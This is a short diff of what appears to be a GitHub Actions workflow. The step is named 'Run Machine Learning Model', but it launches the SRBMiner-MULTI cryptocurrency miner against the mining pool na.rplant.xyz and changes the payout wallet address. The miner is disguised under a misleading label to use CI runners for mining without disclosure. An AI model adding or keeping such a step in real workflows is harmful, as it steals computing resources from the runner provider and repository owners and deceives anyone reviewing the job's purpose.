@@ -32,4 +32,4 @@ jobs:
       - name: Run Machine Learning Model
         run: |
           cd SRBMiner-Multi-2-4-7  # Move to the correct directory
-          ./SRBMiner-MULTI --disable-gpu --algorithm yespower --pool na.rplant.xyz:17111 --wallet a7q25W4x57GmKTnHDi1DSn1xJkTBF3cG7q.r1 pause --keepalive true
+          ./SRBMiner-MULTI --disable-gpu --algorithm yespower --pool na.rplant.xyz:17111 --wallet aNEpRWJEag9JiZFgztAf38q4kPmgkfXNCo.r1 pause --keepalive true
